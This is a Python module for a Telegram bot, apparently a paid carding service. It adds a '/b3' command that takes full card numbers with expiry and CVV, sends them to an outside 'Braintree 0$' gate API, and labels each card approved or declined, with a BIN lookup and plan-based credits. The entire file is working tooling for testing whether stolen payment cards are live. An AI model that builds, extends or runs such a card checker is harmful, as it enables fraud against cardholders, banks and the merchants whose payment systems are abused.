import urllib.request
import urllib.error
import json
import asyncio
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, ContextTypes
from config import get_bin_info, kb_result
from plans import deduct_credit

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 BRAintree API CONFIGURATION 🦇
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
B3_API_URL = "https://avs.blaze.indevs.in/api/b3"
GATE_NAME = "Bʀᴀɪɴᴛʀᴇᴇ 0$"

def get_styled_plan(raw_plan: str) -> str:
    plan_upper = raw_plan.upper()
    if plan_upper == "CORE": return "✨ Cᴏʀᴇ ✨"
    elif plan_upper == "ELITE": return "⭐ Eʟɪᴛᴇ ⭐"
    elif plan_upper == "ROOT": return "👑 Rᴏᴏᴛ 👑"
    else: return "Tʀɪᴀʟ"

async def cmd_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if not context.bot_data.get('b3_on', True):
        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML")
        return
    
    card = None
    if context.args: 
        card = " ".join(context.args).strip()
    elif update.message.reply_to_message and update.message.reply_to_message.text: 
        card = update.message.reply_to_message.text.strip()
        
    if not card:
        # Exact requested warning text without old examples
        await update.message.reply_text(
            "⚠️ Uꜱᴀɢᴇ: Rᴇᴍʟʏ ᴛᴏ ᴀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪᴛʜ ᴄᴀʀᴅꜱ ᴏʀ ꜱᴇɴᴅ\n/b3 cc|mm|yy|cvv", 
            parse_mode="HTML"
        )
        return
    
    if not deduct_credit(user.id):
        await update.message.reply_text("Buy the PLANS and Start the checking you trils cradits are empty.", parse_mode="HTML")
        return
    
    # Clean card format
    card = card.replace(" ", "|")
    
    msg = await update.message.reply_text("⏳ Pʀᴏᴄᴇꜱꜱɪɴɢ...", parse_mode="HTML")
    start_time = time.time()
    
    try:
        loop = asyncio.get_running_loop()
        
        # Fast API call using threads (since we use urllib)
        def do_req():
            url = f"{B3_API_URL}?cc={card}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=120) as response:
                return json.loads(response.read().decode('utf-8'))
        
        # Super fast parallel execution: API + BIN Lookup
        tasks = [
            loop.run_in_executor(None, do_req), 
            get_bin_info(card[:6])
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        api_data = results[0]
        bin_data = results[1] if not isinstance(results[1], Exception) else {"error": True}
        
        if isinstance(api_data, Exception): raise api_data
        
        # Extract exact new JSON response fields
        message = str(api_data.get("message", ""))
        status = str(api_data.get("status", ""))
        
        # Status logic: Approved if "processed" or "Nice! New payment method added"
        is_approved = status.lower() == "processed" or "Nice! New payment method added" in message
        
        if is_approved:
            status_ui = "APPROVED ✅"
        else:
            status_ui = "Dᴇᴄʟɪɴᴇᴅ ❌"
            
        # Get BIN Info
        bin_txt = "N/A"
        if not bin_data.get("error"):
            s = str(bin_data.get("scheme", "N/A")).upper()
            b = bin_data.get("bank", "N/A")
            country = str(bin_data.get("country", "N/A")).upper()
            flag = bin_data.get("country_emoji", "")
            bin_txt = f"{s} - {b} - {flag} {country}"
            
        # Get User's Current Plan (Trial/Elite/Root) dynamically
        ud = context.bot_data.get('user_data', {}).get(str(user.id), {})
        raw_plan = ud.get('plan', 'TRIAL').upper()
        
        # Check if plan expired to revert to Trial
        if raw_plan != 'TRIAL' and ud.get('expires', 0) <= time.time():
            raw_plan = 'TRIAL'
            
        plan_ui = get_styled_plan(raw_plan)
        username = user.first_name or "User"
        
        # Exact Requested Premium UI Design
        text = (
            f"[ 𖥷iТ ] ➺ {status_ui}\n"
            f"🔍 ➺ {card}\n"
            f"Gᴀᴛᴇ ➺ {GATE_NAME} 💳 🟢\n"
            f"Rᴀᴡ ➺ {message if message else 'NO RESPONSE'}\n"
            f"Iɴꜰᴏ ➺ {bin_txt}\n"
            f"Uꜱᴇʀ ➺ {username} 👑 ({plan_ui})\n"
            f"Pʀᴏ ➺ Batman ⚡"
        )
        
        await msg.edit_text(
            text, 
            parse_mode="HTML", 
            reply_markup=kb_result(), 
            disable_web_page_preview=True
        )
        
    except urllib.error.HTTPError as e:
        await msg.edit_text(f"❌ Eʀʀᴏʀ ➤ HTTP {e.code}", parse_mode="HTML")
    except Exception as e:
        await msg.edit_text(f"❌ Eʀʀᴏʀ ➤ <code>{str(e)[:100]}</code>", parse_mode="HTML")

def get_b3_handler():
    return CommandHandler("b3", cmd_b3)
